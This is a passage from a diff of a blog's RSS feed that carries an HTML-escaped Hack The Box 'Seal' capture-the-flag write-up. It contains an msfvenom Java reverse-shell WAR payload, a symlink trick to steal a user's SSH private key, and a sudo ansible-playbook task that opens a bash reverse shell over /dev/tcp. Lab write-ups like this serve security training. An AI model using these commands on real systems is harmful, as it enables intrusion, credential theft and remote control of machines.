+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.4 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4242 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; war &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rev.war7
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Upload the war-File to the adminpanel and deploy it to the tomcat.&lt;/p&gt;
+
+&lt;h3 id=&quot;notes-to-deploying-to-tomcat&quot;&gt;Notes to deploying to tomcat&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Logically the request have to be intercepted with burpsuite because the deploy-Button has links to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manager/html/upload...&lt;/code&gt; which is blocked by nginx. So the path traversal should again be applied.&lt;/li&gt;
+  &lt;li&gt;I had to add the host name to my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;-file but I don’t know why.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;luis-shell&quot;&gt;Luis Shell&lt;/h2&gt;
+
+&lt;p&gt;From tomcat user we have to get shell as luis. Therefore we look around and find an &lt;a href=&quot;https://www.ansible.com/&quot;&gt;ansible&lt;/a&gt; playbook. This playbook under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/backups/playbook&lt;/code&gt; creates backups from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/tomcat9/webapps/ROOT/admin/dashboard&lt;/code&gt;. Luckily the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uploads&lt;/code&gt; directory is writable by everybody. We have to symlink to home-directory from luis to that directory so next time a backup is created the home directory is also in this backup.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/
+&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;zxf backup-2021-09-04-07&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;59&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;32.gz &lt;span class=&quot;nt&quot;&gt;--force-local&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;luis/.ssh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We can get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; file from luis and connect via ssh with his private key. Don’t forget to set the wright permissions to the keyfile &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 600 key.luis&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; key.luis luis@seal.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;root&quot;&gt;root&lt;/h2&gt;
+
+&lt;p&gt;To list the commands which user luis can run without password run: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;. 
+According to the result &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(ALL) NOPASSWD: /usr/bin/ansible-playbook *&lt;/code&gt; it seems like every user can run an ansible-playbook as root without a password.&lt;/p&gt;
+
+&lt;h2 id=&quot;ansible-commands&quot;&gt;ansible commands&lt;/h2&gt;
+
+&lt;p&gt;Looking around I found an &lt;a href=&quot;https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/&quot;&gt;article&lt;/a&gt; whcich describes how to weaponize the ansible-playbook and build a reverse shell with it.&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;tasks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rev&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.18/4242 0&amp;gt;&amp;amp;1&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Run this .yml file with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo ansible-playbook run.yml&lt;/code&gt; and start a listener on your maschine.&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 05 Sep 2022 00:00:00 +0200</pubDate>
+        <link>http://localhost:4000//Seal</link>
+        <link href="http://localhost:4000/Seal"/>
+        <guid isPermaLink="true">http://localhost:4000/Seal</guid>
+      </item>
+    
+  </channel>
+</rss>
